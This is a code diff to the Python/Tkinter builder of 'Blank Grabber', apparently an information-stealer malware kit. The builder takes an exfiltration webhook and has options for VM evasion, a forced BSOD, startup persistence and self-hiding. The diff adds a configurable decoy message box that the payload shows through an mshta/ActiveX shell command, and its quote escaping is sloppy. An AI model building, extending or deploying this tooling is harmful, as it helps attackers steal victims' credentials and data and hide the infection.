@@ -22,6 +22,8 @@ class Builder:
 		self.BSOD = tk.BooleanVar(self.root, True)
 		self.Startup = tk.BooleanVar(self.root, True)
 		self.Hide = tk.BooleanVar(self.root, True)
+		self.MSGbox = tk.BooleanVar(self.root, False)
+		self.MSGboxconf = dict()
 		self.__main__()
 
 	def __main__(self):
@@ -36,9 +38,9 @@ class Builder:
 		ttk.Label(text= "Blank Grabber", font= ("Franklin Gothic", 18, "bold"), foreground= "white", background= "black").place(relx= 0.5, anchor= "n")
 		webhookEntry = ttk.Entry(self.root, foreground= "grey", background= "#303841")
 		webhookEntry.insert(0, "Enter Webhook Here")
-		webhookEntry.bind("<ButtonRelease-1>", lambda event: self.webhookEntryHint(event))
-		webhookEntry.bind("<FocusOut>", lambda event: self.webhookEntryHint(event))
-		webhookEntry.bind("<FocusIn>", lambda event: self.webhookEntryHint(event))
+		webhookEntry.bind("<ButtonRelease-1>", lambda event: self.EntryHint(event, "Enter Webhook Here"))
+		webhookEntry.bind("<FocusOut>", lambda event: self.EntryHint(event, "Enter Webhook Here"))
+		webhookEntry.bind("<FocusIn>", lambda event: self.EntryHint(event, "Enter Webhook Here"))
 		webhookEntry.place(x= 20, y= 60, height= 30, width= 750)
 		testHook_button= tk.Button(self.root, text= "Test Webhook", command= lambda: self.testHook(webhookEntry.get()), background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15)
 		testHook_button.place(x = 770, anchor= "e", y= 110)
@@ -47,12 +49,14 @@ class Builder:
 		VMprotect = tk.Checkbutton(self.root, text= "VM Protect", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.VMprotect, command= lambda: self.ToggleBsod(BSOD))
 		Startup = tk.Checkbutton(self.root, text= "Run On Startup", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Startup)
 		Hide = tk.Checkbutton(self.root, text= "Hide Itself", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Hide)
+		Messagebox = tk.Checkbutton(self.root, text= "Message Box", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.MSGbox, command= self.MessageboxEvent)
 
 		PingME.place(y = 140, x= 20)
 		VMprotect.place(y = 170, x= 20)
 		BSOD.place(y= 200, x= 20)
 		Startup.place(y= 230, x= 20)
 		Hide.place(y= 260, x= 20)
+		Messagebox.place(y= 290, x= 20)
 
 		IconNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center")
 		IconNameLabel.place(x= 560, y= 130, anchor= "e")
@@ -110,19 +114,21 @@ class Builder:
 				else:
 					shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
 		with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
+			if not self.MSGbox.get():
+				self.MSGboxconf = dict()
 			configuration = {
 					"PINGME" : self.PingME.get(),
 					"VMPROTECT" : self.VMprotect.get(),
 					"BSOD" : self.BSOD.get(),
     				"STARTUP" : self.Startup.get(),
-    				"HIDE_ITSELF" : self.Hide.get()
+    				"HIDE_ITSELF" : self.Hide.get(),
+					"MSGBOX" : self.MSGboxconf
 			}
 			json.dump(configuration, file, indent= 4)
 		clear()
 		with open(os.path.join("env", "Scripts", "webhook.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
 			file.write(hook)
 		os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))
-		#print("\u001b[0m", end= "", flush= True)
 		if os.path.isfile("icon.ico"):
 			os.rename("icon.ico", "icon.ico.old")
 		if os.path.isfile("bound.exe"):
@@ -198,6 +204,96 @@ class Builder:
 				raise Exception()
 		except Exception:
 			messagebox.showwarning("Warning", "It looks like your webhook is not working!")
+	
+	def MessageboxEvent(self):
+		if not self.MSGbox.get():
+			return
+		
+		newwindow = tk.Toplevel()
+
+		ICONS = {"Stop Mark" : 16, "Question Mark" : 32, "Exclamation Mark" : 48, "Information Mark" : 64}
+		BUTTONS = {"OK" : 0, "OK and CANCEL" : 1, "ABORT, RETRY and IGNORE" : 2, "YES, NO and CANCEL" : 3, "YES and NO" : 4, "RETRY and CANCEL" : 5}
+
+		def onClose():
+			if not bool(self.MSGboxconf):
+				self.MSGbox.set(False)
+				newwindow.destroy()
+
+		newwindow["background"] = "black"
+		newwindow.grab_set()
+		newwindow.resizable(False, False)
+		newwindow.protocol("WM_DELETE_WINDOW", onClose)
+		newwindow.title("Create message box")
+		newwindow.geometry("700x300")
+
+		titleEntry = ttk.Entry(newwindow, foreground= "grey", background= "#303841", )
+		titleEntry.insert(0, "Title Here")
+		titleEntry.bind("<ButtonRelease-1>", lambda event: self.EntryHint(event, "Title Here"))
+		titleEntry.bind("<FocusOut>", lambda event: self.EntryHint(event, "Title Here"))
+		titleEntry.bind("<FocusIn>", lambda event: self.EntryHint(event, "Title Here"))
+		titleEntry.place(x= 5, y= 20, height= 30, width= 685)
+
+		messageEntry = ttk.Entry(newwindow, foreground= "grey", background= "#303841")
+		messageEntry.insert(0, "Message Here")
+		messageEntry.bind("<ButtonRelease-1>", lambda event: self.EntryHint(event, "Message Here"))
+		messageEntry.bind("<FocusOut>", lambda event: self.EntryHint(event, "Message Here"))
+		messageEntry.bind("<FocusIn>", lambda event: self.EntryHint(event, "Message Here"))
+		messageEntry.place(x= 5, y= 60, height= 30, width= 685)
+
+		ttk.Label(newwindow, text= "Icon:", background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center").place(x= 5, y= 120)
+
+		iconBox = ttk.Combobox(newwindow, values= list(ICONS.keys()), justify= "center", state= "readonly")
+		iconBox.current(3)
+		iconBox.place(x= 80, y= 120)
+
+		ttk.Label(newwindow, text= "Button:", background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center").place(x= 450, y= 120)
+
+		buttonBox = ttk.Combobox(newwindow, values= list(BUTTONS.keys()), justify= "center", state= "readonly")
+		buttonBox.current(0)
+		buttonBox.place(x= 530, y= 120)
+
+		testButton = tk.Button(newwindow, text= "Test", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font = ("Franklin Gothic", 10, "bold"), command= lambda: self.MessageBoxTest(iconBox, buttonBox, ICONS, BUTTONS, titleEntry, messageEntry))
+		testButton.place(x= 540, y= 200, anchor= "w")
+
+		SaveButton = tk.Button(newwindow, text= "Save", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font = ("Franklin Gothic", 10, "bold"), command= lambda: self.MessageBoxSave(newwindow, iconBox, buttonBox, ICONS, BUTTONS, titleEntry, messageEntry))
+		SaveButton.place(x= 90, y= 200, anchor= "w")
+	
+	def MessageBoxSave(self, window, iconbox, buttonbox, ICONS, BUTTONS, titlebox, messagebox):
+		config = {
+			"title" : titlebox.get(),
+			"message" : messagebox.get(),
+			"icon" : ICONS[iconbox.get()],
+			"buttons" : BUTTONS[buttonbox.get()]
+		}
+
+		self.MSGboxconf = config
+		self.MSGbox.set(True)
+		window.destroy()
+
+	def MessageBoxTest(self, iconbox, buttonbox, ICONS, BUTTONS, titlebox, messagebox):
+		config = {
+			"title" : titlebox.get(),
+			"message" : messagebox.get(),
+			"icon" : ICONS[iconbox.get()],
+			"buttons" : BUTTONS[buttonbox.get()]
+		}
+
+		self.messagebox(config)
+
+	def messagebox(self, config):
+		title = config.get("title")
+		message = config.get("message")
+		icon = config.get("icon")
+		buttons = config.get("buttons")
+
+		if not all(x is not None for x in (title, message, icon, buttons)):
+			return
+        
+		title = title.replace("\x22", "\\x22").replace("\x27", "\\x22")
+		message = message.replace("\x22", "\\x22").replace("\x27", "\\x22")
+        
+		cmd = f'''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{message}', 0, '{title}', {icon}+{buttons});close()"'''
+		subprocess.Popen(cmd, shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
 
 	def WindowOpacity(self, event, mode):
 		if not isinstance(event.widget, tk.Tk):
@@ -207,7 +303,7 @@ class Builder:
 		else:
 			self.root.attributes("-alpha", 0.7)
 
-	def webhookEntryHint(self, event):
+	def EntryHint(self, event, text):
 		choice = int(event.type)
 		if choice in (5, 9):
 			if str(event.widget["foreground"]) == "grey":
@@ -216,16 +312,16 @@ class Builder:
 		elif choice == 10:
 			if str(event.widget["foreground"]) == "black" and not len(event.widget.get()):
 				event.widget["foreground"] = "grey"
-				event.widget.insert(0, "Enter Webhook Here")
+				event.widget.insert(0, text)
 
 if __name__ == "__main__":
 	if os.name == "nt":
 		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Data")):
-			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Data folder cannot be found. Please redownload the files!\', 10, \'Error\', 64);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
+			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Data folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
 			os._exit(1)
 		python_version = tuple([sys.version_info[x] for x in range(3)])
 		if python_version[0] > 3 or python_version[1] > 10:
-			subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {python_version[0]}.{python_version[1]}.{python_version[2]} but version < 3.11 is required. Please downgrade it first!\', 10, \'Error\', 64);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
+			subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {python_version[0]}.{python_version[1]}.{python_version[2]} but version < 3.11 is required. Please downgrade it first!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
 			os._exit(1)
 		ToggleConsole(False)
 		Builder()
